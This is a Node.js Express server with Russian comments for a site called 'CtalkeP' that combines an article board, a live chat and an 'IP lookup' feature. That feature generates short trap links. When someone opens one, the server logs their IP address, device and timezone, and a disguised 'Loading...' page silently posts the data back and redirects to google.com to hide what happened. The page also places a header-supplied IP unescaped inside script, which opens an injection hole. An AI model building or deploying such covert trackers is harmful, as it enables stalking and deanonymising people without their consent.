const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Хранилища в оперативной памяти (для экономии ресурсов)
let ipLinks = {}; // Ссылки для сбора IP: { id: { createdAt, redirectUrl: "..." } }
let ipResults = {}; // Результаты кликов: { linkId: { ip, device, timezone, city, time } }
let articles = [
    {
        id: "promo",
        title: "Добро пожаловать в CtalkeP",
        desc: "Стартовая статья проекта",
        content: "Это демонстрационная статья. Вы можете создавать свои статьи и зарабатывать виртуальную валюту!"
    }
];

// Автопингер (чтобы Render не засыпал)
const APP_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
setInterval(() => {
    axios.get(`${APP_URL}/ping`)
        .then(() => console.log('Самопинг успешно выполнен для удержания сервера в активном состоянии.'))
        .catch(err => console.log('Ошибка пинга (это нормально, если сервер локальный):', err.message));
}, 600000); // Каждые 10 минут

app.get('/ping', (req, res) => res.send('pong'));

// Очистка неиспользованных IP-ссылок старше 3 минут (180000 мс)
setInterval(() => {
    const now = Date.now();
    for (const id in ipLinks) {
        if (now - ipLinks[id].createdAt > 180000) {
            delete ipLinks[id];
            console.log(`Ссылка ${id} была автоматически удалена по истечении 3 минут.`);
        }
    }
}, 30000);

// === ФУНКЦИОНАЛ: УЗНАТЬ IP ===

// Создание ссылки-ловушки
app.post('/api/ip/create', (req, res) => {
    const id = Math.random().toString(36).substring(2, 8); // Короткая ссылка
    ipLinks[id] = {
        createdAt: Date.now()
    };
    res.json({ success: true, link: `${APP_URL}/t/${id}`, id });
});

// Клик по ссылке-ловушке (Сбор данных)
app.get('/t/:id', (req, res) => {
    const id = req.params.id;
    if (!ipLinks[id]) {
        return res.send('<h1>Ссылка не существует или истек срок ее действия (3 минуты)</h1>');
    }

    // Собираем доступные данные на стороне сервера
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Неизвестное устройство';
    
    // Передаем клиенту HTML, который тихо соберет часовой пояс и перенаправит на пустую красивую страницу, стерев след
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Загрузка...</title>
        </head>
        <body>
            <script>
                const data = {
                    ip: "${ip}",
                    device: navigator.userAgent,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    city: "Определяется провайдером"
                };
                
                // Отправляем собранные данные обратно на сервер
                fetch('/api/ip/collect/${id}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    // Перенаправление на нейтральный сайт (маскировка)
                    window.location.href = "https://www.google.com";
                });
            </script>
        </body>
        </html>
    `);
});

// Прием собранных данных и моментальное удаление ссылки-ловушки
app.post('/api/ip/collect/:id', (req, res) => {
    const id = req.params.id;
    if (ipLinks[id]) {
        ipResults[id] = {
            ip: req.body.ip,
            device: req.body.device,
            timezone: req.body.timezone,
            city: req.body.city,
            time: new Date().toLocaleTimeString()
        };
        // Моментальное удаление ссылки после первого перехода
        delete ipLinks[id];
        res.json({ success: true });
    } else {
        res.status(404).json({ error: "Ссылка уже неактивна" });
    }
});

// Проверка статуса ловушки (клиент опрашивает сервер)
app.get('/api/ip/status/:id', (req, res) => {
    const id = req.params.id;
    if (ipResults[id]) {
        res.json({ status: 'caught', data: ipResults[id] });
    } else if (ipLinks[id]) {
        res.json({ status: 'pending' });
    } else {
        res.json({ status: 'expired' });
    }
});

// === ФУНКЦИОНАЛ: СТАТЬИ ===

// Получить все публичные статьи
app.get('/api/articles', (req, res) => {
    res.json(articles);
});

// Создать новую статью
app.post('/api/articles', (req, res) => {
    const { title, desc, content } = req.body;
    if (!title || !content) return res.status(400).json({ error: "Заполните поля" });
    
    const id = Math.random().toString(36).substring(2, 10);
    const newArticle = { id, title, desc: desc || "Без описания", content };
    articles.push(newArticle);
    
    res.json({ success: true, article: newArticle });
});

// Получить конкретную статью
app.get('/api/articles/:id', (req, res) => {
    const article = articles.find(a => a.id === req.params.id);
    if (!article) return res.status(404).json({ error: "Статья не найдена" });
    res.json(article);
});

// === АКТИВНЫЙ ЧАТ (SSE для нулевой нагрузки) ===
let clients = [];

app.get('/api/chat/stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    
    clients.push(res);
    
    req.on('close', () => {
        clients = clients.filter(client => client !== res);
    });
});

app.post('/api/chat/send', (req, res) => {
    const { username, text, tag } = req.body;
    const message = { username, text, tag, time: new Date().toLocaleTimeString() };
    
    // Рассылаем всем подключенным пользователям (сообщения не сохраняются на сервере!)
    clients.forEach(client => client.write(`data: ${JSON.stringify(message)}\n\n`));
    res.json({ success: true });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});